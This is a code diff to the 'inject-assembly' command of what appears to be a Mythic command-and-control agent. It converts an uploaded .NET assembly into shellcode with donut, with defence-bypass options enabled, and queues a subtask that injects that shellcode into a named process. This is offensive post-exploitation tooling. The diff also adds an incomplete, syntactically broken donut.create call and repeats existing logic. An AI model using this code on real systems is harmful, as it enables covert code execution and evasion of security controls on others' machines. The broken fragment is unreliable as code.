@@ -78,6 +78,44 @@ class InjectAssemblyCommand(CommandBase):
                                         file_id=task.args.get_arg("file"),
                                         task_id=task.id,
                                         get_contents=True)
+        
+        fData = FileData()
+        fData.AgentFileId = task.args.get_arg("file")
+        file = await SendMythicRPCFileGetContent(fData)
+        
+        if file.Success:
+            file_contents = base64.b64encode(file.Content)
+            task.args.add_arg("contents", file_contents.decode("utf-8"))
+        else:
+            raise Exception("Failed to get file contents: " + file.Error)
+
+        #Create a temporary file
+        temp = tempfile.NamedTemporaryFile()
+
+        #write file to disk
+        temp.write(base64.b64decode(file_contents))
+
+        shellcode = donut.create(
+            file=temp.name,
+            arch=3,
+            bypass=3,
+            params = task.args.get_arg("arguments"),
+            exit_opt = 2,
+        )
+        fileCreate = MythicRPCFileCreateMessage()
+
+        fileCreate.FileContents = shellcode
+        fileCreate.Filename = "shellcode.bin"
+        fileCreate.TaskID = task.id
+        fileCreate.DeleteAfterFetch = True
+
+        shellcodeFile = await SendMythicRPCFileCreate(fileCreate)
+        
+        if shellcodeFile.Success:
+            createSubtaskMessage = MythicRPCTaskCreateSubtaskMessage()
+            createSubtaskMessage.TaskID = task.id
+            createSubtaskMessage.CommandName = "inject-shellcode"
+            createSubtaskMessage.Params = "{\"file\":\"" + shellcodeFile.AgentFileId + "\", \"processName\":\"" + task.args.get_arg("processName") + "\", \"output\":\"" + task.args.get_arg("output") + "\"}"
 
         if file_resp.status == MythicRPCStatus.Success:
             if len(file_resp.response) > 0:
@@ -90,6 +128,12 @@ class InjectAssemblyCommand(CommandBase):
                 #write file to disk
                 temp.write(base64.b64decode(file_contents))
 
+                shellcode = donut.create(
+                    file = temp.name
+                    arch = 
+                )
+
+
                 #run donut on file
                 shellcode = donut.create(
                     file=temp.name,
@@ -97,6 +141,8 @@ class InjectAssemblyCommand(CommandBase):
                     bypass=3,
                     params = '',
                 )
+
+
 
                 print(len(shellcode))
 
